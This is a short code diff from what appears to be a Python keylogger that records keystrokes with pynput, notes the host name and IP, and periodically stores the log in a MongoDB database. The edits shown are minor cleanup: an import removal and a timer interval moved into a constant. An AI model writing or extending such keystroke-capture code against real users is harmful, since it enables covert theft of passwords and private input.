@@ -1,4 +1,4 @@
-import Constants, pynput, datetime, os, threading, socket, logging
+import Constants, pynput, datetime, os, threading, socket
 
 from pynput.keyboard import Key, Listener
 from pymongo import MongoClient
@@ -49,6 +49,7 @@ def complete_log() :
 def reset_log() :
 	global log
 	global keys_typed
+
 	log = ""
 	keys_typed = ""
 
@@ -69,7 +70,7 @@ def get_host_name_IP():
 
 def start_logging():
 	get_host_name_IP()
-	timer = set_time_to_store_data(store_in_database, 5)
+	timer = set_time_to_store_data(store_in_database, Constants.time_before_store)
 
 start_logging()
 
